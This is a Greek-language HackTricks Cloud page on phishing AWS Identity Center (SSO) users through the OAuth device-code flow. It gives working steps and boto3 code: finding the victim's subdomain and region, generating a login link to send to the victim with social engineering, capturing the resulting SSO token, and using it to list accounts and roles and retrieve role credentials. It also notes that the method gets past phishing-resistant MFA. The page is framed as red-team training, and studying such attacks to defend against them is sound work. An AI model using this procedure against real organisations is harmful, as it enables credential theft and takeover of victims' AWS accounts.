# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Ελέγξτε τα [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## AWS Device Code Phishing

Αρχικά προτάθηκε σε [**αυτό το blog post**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), είναι δυνατό να σταλεί ένας **σύνδεσμος** σε έναν χρήστη που χρησιμοποιεί AWS SSO που αν ο **χρήστης αποδεχτεί** ο επιτιθέμενος θα μπορέσει να αποκτήσει ένα **token για να υποδυθεί τον χρήστη** και να έχει πρόσβαση σε όλους τους ρόλους που ο χρήστης μπορεί να έχει πρόσβαση στο **Identity Center**.

Για να πραγματοποιηθεί αυτή η επίθεση οι προϋποθέσεις είναι:

* Το θύμα πρέπει να χρησιμοποιεί **Identity Center**
* Ο επιτιθέμενος πρέπει να γνωρίζει το **subdomain** που χρησιμοποιεί το θύμα `<victimsub>.awsapps.com/start`

Μόνο με τις παραπάνω πληροφορίες, ο **επιτιθέμενος θα μπορέσει να στείλει έναν σύνδεσμο στον χρήστη** που αν **αποδεχτεί** θα δώσει στον **επιτιθέμενο πρόσβαση στον λογαριασμό του AWS χρήστη**.

### Επίθεση

1. **Εύρεση του subdomain**

Το πρώτο βήμα του επιτιθέμενου είναι να βρει το subdomain που χρησιμοποιεί η εταιρεία του θύματος στο Identity Center. Αυτό μπορεί να γίνει μέσω **OSINT** ή **guessing + BF** καθώς οι περισσότερες εταιρείες θα χρησιμοποιούν το όνομά τους ή μια παραλλαγή του ονόματός τους εδώ.

Με αυτές τις πληροφορίες, είναι δυνατό να βρεθεί η περιοχή όπου το Identity Center έχει ρυθμιστεί με:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Δημιουργήστε τον σύνδεσμο για το θύμα & Στείλτε τον**

Εκτελέστε τον ακόλουθο κώδικα για να δημιουργήσετε έναν AWS SSO σύνδεσμο σύνδεσης ώστε το θύμα να μπορέσει να αυθεντικοποιηθεί.\
Για την επίδειξη, εκτελέστε αυτόν τον κώδικα σε μια python κονσόλα και μην την κλείσετε καθώς αργότερα θα χρειαστείτε κάποια αντικείμενα για να πάρετε το token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Στείλτε τον παραγόμενο σύνδεσμο στο θύμα χρησιμοποιώντας τις εξαιρετικές σας δεξιότητες κοινωνικής μηχανικής!

3. **Περιμένετε μέχρι το θύμα να τον αποδεχτεί**

Αν το θύμα ήταν **ήδη συνδεδεμένο στο AWS** θα χρειαστεί μόνο να αποδεχτεί την παραχώρηση των δικαιωμάτων, αν δεν ήταν, θα χρειαστεί να **συνδεθεί και μετά να αποδεχτεί την παραχώρηση των δικαιωμάτων**.\
Έτσι φαίνεται το προτροπή στις μέρες μας:

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Αποκτήστε SSO access token**

Αν το θύμα αποδέχτηκε την προτροπή, εκτελέστε αυτόν τον κώδικα για να **δημιουργήσετε ένα SSO token προσποιούμενοι τον χρήστη**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
Το SSO access token είναι **έγκυρο για 8 ώρες**.

5. **Υποδυθείτε τον χρήστη**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

Είναι διασκεδαστικό να γνωρίζουμε ότι η προηγούμενη επίθεση **λειτουργεί ακόμα και αν χρησιμοποιείται ένα "unphisable MFA" (webAuth)**. Αυτό συμβαίνει επειδή η προηγούμενη **ροή εργασίας δεν αφήνει ποτέ τον χρησιμοποιούμενο τομέα OAuth**. Όχι όπως σε άλλες επιθέσεις phishing όπου ο χρήστης πρέπει να αντικαταστήσει τον τομέα σύνδεσης, στην περίπτωση αυτή η ροή εργασίας του κωδικού συσκευής είναι προετοιμασμένη έτσι ώστε ένας **κωδικός να είναι γνωστός από μια συσκευή** και ο χρήστης μπορεί να συνδεθεί ακόμα και σε διαφορετική μηχανή. Αν γίνει αποδεκτή η προτροπή, η συσκευή, απλά με το **να γνωρίζει τον αρχικό κωδικό**, θα είναι σε θέση να **ανακτήσει διαπιστευτήρια** για τον χρήστη.

Για περισσότερες πληροφορίες σχετικά με αυτό [**ελέγξτε αυτήν την ανάρτηση**](https://mjg59.dreamwidth.org/62175.html).

### Automatic Tools

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## References

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
